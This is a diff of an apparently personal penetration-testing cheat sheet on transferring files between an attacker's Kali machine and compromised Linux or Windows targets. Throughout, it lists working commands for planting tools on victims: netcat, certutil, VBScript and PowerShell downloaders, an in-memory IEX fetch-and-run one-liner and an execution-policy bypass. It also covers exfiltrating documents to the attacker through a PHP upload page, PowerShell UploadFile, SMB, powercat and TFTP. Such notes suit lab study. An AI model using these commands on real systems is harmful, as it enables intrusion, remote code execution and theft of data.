@@ -1,50 +1,38 @@
-# File transfers 
+---
+title: "File transfers"
+author: "Me"
+date: "February 25, 2022"
+output: html_document
+---
 
-## Downloads (from Kali to the victim)
+# File transfers
+{:.no_toc}
 
-### Linux targets
+Here's the content so far:
+
+1. TOC
+{:toc}
+{:style="color:black; font-size: 150%;"}
 
 
-#### Netcat
-Can transfer files in both text and binary. On the target:
+## Netcat
+Netcat can transfer files in both text and binary. It is simple to use but not always installed on the target.\\
+
 ````
-nc -nlvp 4444 > incoming.txt
+nc -nlvp 4444 > incoming.txt                  // Receiving end
+nc -nv <target IP> 4444 < <path to file>      // Sending end
 ````
-On Kali:
+
+## FTP
+As netcat, FTP can transfer files in both text and binary. Depending on the transfer direction, it may be necessary to install Pure-FTPd on Kali (sudo apt update && sudo apt install pure-ftpd, then create a new user).
+
 ````
-sudo nc -nv <target IP> 4444 < <path to file>
+binary                // Optional: switch to binary mode
+put <filename>        // Upload a file on the server
+get <filename>        // Downloads a file from the server
 `````
 
-
-#### FTP
-Install Pure-FTPd on Kali (sudo apt update && sudo apt install pure-ftpd).
-Create a new user for Pure-FTPd (check how to on the net)
-
-#### HTTP
-Start a web server on Kali and download the file from the compromised machine
-
-#### Socat
-...
-
-#### netcat
-
-#### curl, wget
-
-
-### Windows targets
-
-#### Netcat
-Can transfer files in both text and binary. On Windows:
-````
-nc -nlvp 4444 > incoming.exe
-````
-On Kali:
-````
-sudo nc -nv <Windows IP> 4444 < <path to file>
-`````
-
-#### FTP
-We can use the FTP -s flag, which allows us to specify a text file containing FTP commands that will be executed automatically when FTP starts.
+We can also use FTP's *-s* flag, which allows us to specify a text file containing FTP commands that will be executed automatically when FTP starts.
 - Set up an FTP server on Kali 
 - Place the file to transfer (in this example _nc.exe_) in /ftphome directory.
 - On Windows, create a _ftp.txt_ file containing the commands to execute (transfer the file in binary mode):
@@ -60,9 +48,22 @@ We can use the FTP -s flag, which allows us to specify a text file containing FT
   ```
   ftp -v -n -s:ftp.txt
   ````
-  -v to suppress any returned output, -n to suppress automatic login, -s to specify the file
-  
-#### VBScript
+  *-v* to suppress any returned output, *-n* to suppress automatic login, *-s* to specify the file.
+
+
+## HTTP
+Often used to serve a file from Kali and download it to the target machine.\\
+Start a web server on Kali (Python or Apache) and download the file from the compromised machine:
+
+````
+sudo python -m SimpleHTTPServer         // Starts a web server on port 8000 by default
+sudo service Apache2 restart            // Starts an Apache web server
+wget http://<kali_IP>:<port>/<file>     // Downloads the file from a Linux machine
+certutil.exe -urlcache -split -f http://<kali_IP>:<port>/<file>     // Downloads the file from a Windows machine
+`````
+Python web root directory is the directory in which the command was issued, whereas Apache's web root directory is always */var/www/*.
+
+## VBScript
 We can issue the following commands into a remote shell to write out a _wget.vbs_ script that acts as a HTTP downloader:
 `````
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -98,20 +99,22 @@ We can then run this script from Windows to download a file on Kali:
 cscript wget.vbs http://<Kali IP>/<File to download> <Name of the downloaded file>
 `````
 
+## Powershell
+PowerShell can be used to transfer files between Kali and Windows in both directions.\\
+**Kali -> Windows** (start a web server on Kali):
 
-#### Powershell
-Create a Powershell downloader script on the Windows machine:
+Create a Powershell downloader script (*wget.ps1*) on the Windows machine:
 ````
 echo $webclient = New-Object System.Net.WebClient >>wget.ps1
 echo $url = "http://<Kali IP>/<File to download>" >>wget.ps1
 echo $file = "new-exploit.exe" >>wget.ps1
 echo $webclient.DownloadFile($url,$file) >>wget.ps1
 `````
-Run this script on Windows:
+Run the script:
 ````
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ````
-The execution of ppowershell scripts is restricted by default, so we allow it with _-ExecutionPolicy Bypass_.
+The execution of powershell scripts is restricted by default, so we allow it with _-ExecutionPolicy Bypass_.
 
 Alternative one-liners:
 ````
@@ -124,69 +127,7 @@ Download without saving the file to disk:
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://<Kali IP>/<File to download>')
 ````
 
-
-#### Exe2hex and Powershell
-Example to transfer nc.exe from Kali to Windows by executing the following steps:
-- Compress the file with _upx_:
-````
-upx -9 nc.exe
-````
-- Convert the file to a Windows script (_.cmd_) with _exe2hex_:
-```
-exe2hex -x nc.exe -p nc.cmd
-````
-
-- Copy the script (we can copy it to the clipboard with _cat nc.cmd | xclip -selection clipboard_)
-
-- Paste the script in the remote shell. This will automatically transfer the hex file on Windows and convert it back to binary (at the end of the script, there are commands which rebuild the _nc.exe_ executable on the target).
-
-
-
-#### Certutil
-Download a file from the internet:
-````
-certutil.exe -urlcache -split -f http://<Kali IP>/<File to download> <Name of the downloaded file>
-certutil.exe -verifyctl -f -split http://<Kali IP>/<File to download> <Name of the downloaded file>
-`````
-
-
-
-
-
-
-## Uploads (from the victim to Kali)
-
-Used to exfiltrate data.
-
-### Windows targets
-
-#### Netcat
-Can transfer files in both text and binary. On Kali:
-````
-nc -nlvp 4444 > incoming.txt
-````
-On Windows:
-````
-nc -nv <Kali IP> 4444 < <path to file>
-`````
-
-#### SMB
-Start a server on Kali:
-
-````
-sudo impacket-smbserver <sharename> .
-`````
-Transfer the file from Windows (use backslashes and double backslashes in front of Kali's IP in the command below):
-
-````
-copy C:<path to file> \\<kali IP>\<sharename>\<filename>
-`````
-
-
-#### PowerShell
-
-Complex because standard TFTP, FTP, and HTTP servers are rarely enabled on Windows by default. 
-If outbound HTTP traffic is allowed, we can use the _System.Net.WebClient_ Powershell class.
+**Windows -> Kali** (WARNING: this allows anyone to upload files on Kali)
 
 Create the following PHP script on Kali and save it as _upload.php_ in the webroot directory (_/var/www/html_):
 
@@ -207,48 +148,72 @@ ps -ef | grep apache
 sudo chown www-data: /var/www/uploads
 ls -al
 ````
-Warning: this allows anyone interacting with _uploads.php_ to upload files on Kali.
 
-Finally, from Windows, invoke the _UploadFile_ method from the _System.Net.WebClient_ class to upload the document we want to exfiltrate:
+From Windows, invoke the _UploadFile_ method from the _System.Net.WebClient_ class to upload the document we want to exfiltrate:
 
 ````
 powershell (New-Object System.Net.WebClient).UploadFile('http://<Kali IP>/upload.php', '<Doc to exfil')
 `````
 
-#### Powercat
 
-On Kali:
+## Exe2hex
+Compress and transfer files. Example to transfer nc.exe from Kali to Windows:
+
 ````
-sudo nc -nlvp 443 > <name of the object that will be received>
+upx -9 nc.exe                   // Compress the file with upx
+exe2hex -x nc.exe -p nc.cmd     // Convert the file to a Windows script (.cmd) with exe2hex
 ````
-On Windows:
+Copy the script (we can copy it to the clipboard with _cat nc.cmd | xclip -selection clipboard_) and paste it in the remote shell. This will automatically transfer the hex file on Windows and convert it back to binary (at the end of the script, there are commands which rebuild the _nc.exe_ executable on the target).
+
+
+## Certutil
+Reliable and often installed tool on Windows machines:
+
 ````
-powercat -c <Kali IP> -p 443 -i C:\<path of the object to transfer>
+certutil.exe -urlcache -split -f http://<Kali IP>/<File to download> <Name of the downloaded file>
+certutil.exe -verifyctl -f -split http://<Kali IP>/<File to download> <Name of the downloaded file>
+`````
+
+
+## SMB
+Start a server on Kali/Linux host, and copy the file to the created share (use backslashes and double backslashes in front of Kali's IP in the command below):
+
+````
+sudo impacket-smbserver <sharename> .
+copy <path to file> \\<kali IP>\<sharename>\<filename>
+`````
+
+
+## Powercat
+Similar to Netcat. It may be necessary to transfer powercat to the target machine beforehand.
+
+````
+sudo nc -nlvp 443 > <name of the object that will be received>        // Receiving end
+powercat -c <Kali IP> -p 443 -i C:\<path of the object to transfer>   // Sending end
 ````
 In this command, _-c_ specifies the client mode and sets the listening address, _-i_ indicates the local file to transfer.
 
 
-#### TFTP 
-
+## TFTP 
 TFTP is a UDP-based file transfer protocol.
-Rarely works (often restricted by egress firewall rules), but can come handy in certain situation. 
+Rarely works (often restricted by egress firewall rules), but can come handy in certain situations. 
 For example, it can be used on older systems if PowerShell isn't installed.
 
-- Install and configure a TFTP server on Kali:
+- Install and configure a TFTP server on Kali/Linux (receiving end):
   ````
   sudo apt update && sudo apt install atftp
   sudo mkdir /tftp
   sudo chown nobody: /tftp
   sudo atftpd --daemon --port 69 /tftp
   ````
-- On Windows, run the TFTP client with _-i_ to specify a binary image transfer:
+- On the sending end, run the TFTP client with _-i_ to specify a binary image transfer:
   ````
   tftp -i <Kali IP> put <Doc to exfil>
   ````
 
-
-
-
+## Socat
+...
+  
 
 
 
